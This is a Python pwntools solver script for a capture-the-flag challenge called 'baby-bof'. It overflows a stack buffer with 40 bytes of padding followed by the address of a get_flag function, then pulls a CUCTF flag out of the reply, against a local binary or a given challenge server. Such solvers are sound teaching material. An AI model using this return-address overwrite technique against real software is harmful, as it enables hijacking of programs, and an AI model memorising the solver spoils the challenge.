#!/usr/bin/env python3
from pwn import *
import argparse
import sys
import re

parser = argparse.ArgumentParser()
parser.add_argument('-n', '--hostname', help='Hostname or ip address of the challenge server', required=False)
parser.add_argument('-p', '--port', type=int, help='Port of the challenge server', required=False)
args = parser.parse_args()

binary = './baby-bof'
e = ELF(binary)

if args.hostname and args.port:
    p = remote(args.hostname, args.port)
else:
    p = process(binary)

p.sendline(b'A'*40 + p64(e.symbols['get_flag']))
p.recvline()

response = p.recvline()
p.close()

match = re.search(r".*(CUCTF{[a-zA-Z0-9_].*}).*", response.decode())

if match:
    print(match.group(1))
    sys.exit(0)

print('Failed!')
sys.exit(1)
